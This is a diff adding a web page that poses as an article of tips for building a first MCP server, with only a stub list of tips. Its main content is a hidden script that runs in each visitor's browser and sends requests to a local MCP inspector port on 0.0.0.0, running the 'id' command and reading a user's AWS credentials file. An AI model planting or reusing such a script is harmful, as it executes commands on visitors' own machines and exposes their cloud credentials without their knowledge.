@@ -1,0 +1,16 @@
+<!doctype html>
+<html>
+<head>
+<meta name="origin" content="https://mcp-tips.example">
+<title>Five tips for building your first MCP server</title>
+</head>
+<body>
+<h1>Five tips for building your first MCP server</h1>
+<p>1. Start with one tool. 2. Test it in an inspector. 3. ...</p>
+<script>
+// Runs in the visitor's browser. 0.0.0.0 reaches services on the visitor's own machine.
+fetch("http://0.0.0.0:6277/sse?transportType=stdio&command=id", {mode: "no-cors"});
+fetch("http://0.0.0.0:6277/sse?transportType=stdio&command=cat&args=/Users/rohan/.aws/credentials", {mode: "no-cors"});
+</script>
+</body>
+</html>
